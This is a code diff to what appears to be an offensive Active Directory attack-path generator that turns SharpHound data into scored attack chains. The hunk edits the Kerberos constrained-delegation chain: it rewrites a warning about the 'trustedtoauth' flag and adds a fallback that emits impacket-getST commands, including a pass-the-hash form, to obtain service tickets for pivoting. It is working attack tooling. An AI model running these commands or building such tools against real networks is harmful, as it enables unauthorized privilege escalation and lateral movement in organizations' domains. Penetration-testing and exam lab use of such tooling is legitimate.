@@ -1007,12 +1007,19 @@ def run(report, store, ui=None):
             # older SharpHound zips may leave it undefined (we default to
             # True in that case so we don't fire the warning on stale data).
             _t2a = delegator_t2a.get(ulc, True)
+            # iter-92: warn when T2A4D is clear; -impersonate will
+            # KDC_ERR_BADOPTION. iter-152: also emit a viable fallback
+            # command that drops -impersonate - the operator still gets
+            # a TGS for {first_spn} as the delegator itself, which is
+            # the correct outcome when protocol transition isn't allowed.
+            # If the delegator has meaningful rights on {_spn_host} (a
+            # machine account with LOCAL SYSTEM on it, for example),
+            # this is enough to pivot. Not DA-track, but exam-viable.
             _t2a_note = "" if _t2a else (
                 "# CAUTION: 'trustedtoauth' flag NOT set on this delegator - "
-                "getST -impersonate administrator will fail (S4U2Self "
-                "constrained to the delegator itself). Try S4U2Self "
-                "impersonating THE DELEGATOR itself, or drop the "
-                "-impersonate flag entirely.")
+                "getST -impersonate administrator will fail (S4U2Self ticket "
+                "is non-forwardable; S4U2Proxy refuses). Fallback: drop the "
+                "-impersonate flag entirely (see NO-IMPERSONATE cmd below).")
             chains.append(Chain("R-CONSTRAINED", "constrained delegation",
                 f"{ulc} has AllowedToDelegateTo: {_spn_summary}",
                 crit=8, conf=0.9, ready=1.4, prox=0.95,           # score 9.58
@@ -1036,6 +1043,20 @@ def run(report, store, ui=None):
                      if pw.startswith(":") else
                      f"impacket-getST -spn '{first_spn}' -impersonate administrator "
                      f"-dc-ip {_dc_c} '{_sh_sq(_dom_c)}/{_sh_sq(ulc)}:{_sh_sq(pw)}'"),
+                    # iter-152: NO-IMPERSONATE fallback for T2A4D-clear delegators.
+                    # Yields a service ticket for {first_spn} authenticating as the
+                    # delegator itself; only useful if the delegator has meaningful
+                    # rights on the SPN's target host. Not DA-track but still
+                    # exam-viable when the delegator is a machine account with
+                    # LOCAL SYSTEM privileges on {_spn_host}.
+                    *([(f"# NO-IMPERSONATE (works without T2A4D):"),
+                       (f"impacket-getST -spn '{first_spn}' "
+                        f"-dc-ip {_dc_c} -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}' "
+                        f"'{_sh_sq(_dom_c)}/{_sh_sq(ulc)}'"
+                        if pw.startswith(":") else
+                        f"impacket-getST -spn '{first_spn}' "
+                        f"-dc-ip {_dc_c} '{_sh_sq(_dom_c)}/{_sh_sq(ulc)}:{_sh_sq(pw)}'")]
+                      if not _t2a else []),
                     f"export KRB5CCNAME=administrator.ccache",
                     *_followup,
                 ], src=best_src, line=best_line))
